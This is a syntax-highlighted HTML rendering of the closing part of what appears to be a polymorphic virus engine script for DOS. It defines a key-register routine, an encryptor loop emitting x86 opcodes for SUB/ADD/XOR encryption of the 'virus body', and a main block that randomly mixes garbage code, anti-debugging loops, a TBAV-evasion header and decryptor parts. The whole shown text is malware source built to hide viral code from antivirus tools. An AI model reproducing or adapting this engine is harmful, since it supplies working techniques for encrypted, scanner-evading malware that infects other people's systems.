    </span><span class="sc11">SW_KeyReg</span><span class="sc10">=</span><span class="sc11">SW_KeyReg</span><span class="sc10">&amp;</span><span class="sc4">00000111b</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00000100b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">11000000b</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">00001000b</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">11000000b</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">00001000b</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">11000000b</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">00001000b</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">11000000b</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">00001000b</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">11000000b</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">00001000b</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">11000000b</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">00001000b</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">10000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">11000000b</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SW_KeyReg</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">randvar</span><span class="sc10">&amp;</span><span class="sc4">00001000b</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc10">};</span><span class="sc0"> 
    </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">$key</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">key</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">



</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
// SetKeyReg
// --------------------------------------------------------------------------------------------
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_SetKeyRegInstrType</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// 0=MOV    1=ClearReg &amp; OR/XOR/ADD/SUB + SetReg OR,XOR,ADD,SUB  
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">SW_SetKeyRegDataType</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// 0=Imm    1=Address
</span><span class="sc11">variable</span><span class="sc0"> </span><span class="sc11">OP_SetKey</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">SetKeyReg</span><span class="sc0"> </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">randvar</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">MovRegKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">shift</span><span class="sc0">   </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">CleanRegKey</span><span class="sc10">;</span><span class="sc0"> 
        </span><span class="sc11">SetRegKey</span><span class="sc10">;</span><span class="sc0">      
        </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">






</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">Encryptor</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc11">IP</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// the decryptor starts at offset 0000 
</span><span class="sc0">
    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">EXo_EncryptorOffset</span><span class="sc10">;</span><span class="sc0"> 

    </span><span class="sc2">//push registers
</span><span class="sc0">    </span><span class="sc11">$50h</span><span class="sc10">;</span><span class="sc11">$53h</span><span class="sc10">;</span><span class="sc11">$56h</span><span class="sc10">;</span><span class="sc11">$57h</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">//set registers
</span><span class="sc0">    </span><span class="sc11">$0BBh</span><span class="sc10">;</span><span class="sc11">$key</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">key</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc2">// mov bx,
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">EXi_VirusBodyLength</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXi_VirusBodyLength</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">)&gt;</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc11">$0B9h</span><span class="sc10">;</span><span class="sc11">$EXi_VirusBodyLength</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">EXi_VirusBodyLength</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// mov cx,
</span><span class="sc0">    </span><span class="sc11">$0BEh</span><span class="sc10">;</span><span class="sc11">$EXi_VirusBodyStart</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">EXi_VirusBodyStart</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc2">// mov si,
</span><span class="sc0">    </span><span class="sc11">$0BFh</span><span class="sc10">;</span><span class="sc11">$OFS_EncryptedVirusBodyStart</span><span class="sc10">;</span><span class="sc11">$</span><span class="sc10">=</span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc10">&gt;</span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc2">// mov di, 
</span><span class="sc0">
    </span><span class="sc2">//encryption loop
</span><span class="sc0">    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">encryption_loop</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc11">$0ACh</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">$0ADh</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">// lodsb/lodsw
</span><span class="sc0">
    </span><span class="sc11">select</span><span class="sc0">  </span><span class="sc11">SW_CryptType</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00101000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//SUB
</span><span class="sc0">        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00000000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//ADD
</span><span class="sc0">        </span><span class="sc11">$</span><span class="sc10">=</span><span class="sc4">00110000b</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">SW_KeySize</span><span class="sc10">&amp;</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//XOR
</span><span class="sc0">    </span><span class="sc10">};</span><span class="sc0"> 

    </span><span class="sc11">$0D8h</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_KeySize</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc11">$0AAh</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc11">$0ABh</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">   </span><span class="sc2">// stosb/stosw
</span><span class="sc0">    </span><span class="sc11">$0E2h</span><span class="sc10">;</span><span class="sc11">$deltab</span><span class="sc0"> </span><span class="sc11">encryption_loop</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// loop encryption_loop;
</span><span class="sc0">
    </span><span class="sc2">//pop registers
</span><span class="sc0">    </span><span class="sc11">$5Fh</span><span class="sc10">;</span><span class="sc11">$5Eh</span><span class="sc10">;</span><span class="sc11">$5Bh</span><span class="sc10">;</span><span class="sc11">$58h</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">$0CBh</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">//retf 
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">




</span><span class="sc2">// This of course, is not the virus body. 
// But it reserves the necesary space, and keeps tracks of where the virusbody 
// should start/end. The encryptor will later encrypt and copy the virus body here.
//////////////////////////////////////////////////////////////////////////////////////////////
// this is the virus body
</span><span class="sc11">function</span><span class="sc0"> </span><span class="sc11">VirusBody</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Sectionsdone</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> 
        </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">OFS_FirstPart</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">$0E9h</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$deltaw</span><span class="sc0"> </span><span class="sc11">LB_DecryptLoop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">    </span><span class="sc2">//000/001
</span><span class="sc0">        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// 010/011
</span><span class="sc0">        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">//100/101
</span><span class="sc0">        </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc2">//110/111 
</span><span class="sc0">         </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_VirusBody</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc2">// Clean the prefetch queue if needed
</span><span class="sc0">    </span><span class="sc11">select</span><span class="sc0"> </span><span class="sc11">SW_Direction</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">noop</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">$0EBh</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">$0</span><span class="sc10">;};</span><span class="sc0">  </span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc2">//place a MOV BP, offset 
</span><span class="sc0">    </span><span class="sc2">// the "CALL $+3/POP BP" is not necesary in the virus code 
</span><span class="sc0">    </span><span class="sc2">//$0BDh; $offset OFS_EncryptedVirusBodyStart2;
</span><span class="sc0">
    </span><span class="sc11">EXo_EncryptedVirusBodyOffset</span><span class="sc10">=</span><span class="sc11">IP</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_EncryptedVirusBodyStart</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_EncryptedVirusBodyStart2</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">IP</span><span class="sc10">=</span><span class="sc11">IP</span><span class="sc10">+</span><span class="sc11">EXi_VirusBodyLength</span><span class="sc10">+</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">OFS_EncryptedVirusBodyEnd</span><span class="sc10">;</span><span class="sc0">

    
    </span><span class="sc11">SW_Sectionsdone</span><span class="sc10">=</span><span class="sc11">SW_Sectionsdone</span><span class="sc10">|</span><span class="sc4">100</span><span class="sc10">;</span><span class="sc0">
    
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">








</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////
// The main bone
// --------------------------------------------------------------------------------------------
</span><span class="sc11">main</span><span class="sc0"> </span><span class="sc11">all</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Init</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc19">label</span><span class="sc0"> </span><span class="sc11">EXo_DecryptorStart</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc2">// Time to set this External variable
</span><span class="sc0">
    </span><span class="sc11">TBAVHeader</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">random</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">garbage</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">garbage</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">Int16Fuc</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">KillerLoopFuc</span><span class="sc10">;</span><span class="sc0">      
        </span><span class="sc11">DecryptorFirstPart</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">DecryptorSecondPart</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">VirusBody</span><span class="sc10">;</span><span class="sc0">  
    </span><span class="sc10">};</span><span class="sc0">  

    </span><span class="sc11">Fin</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">Encryptor</span><span class="sc10">;</span><span class="sc0">
         
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////
</span><span class="sc0">
</span></div></body>
</html>
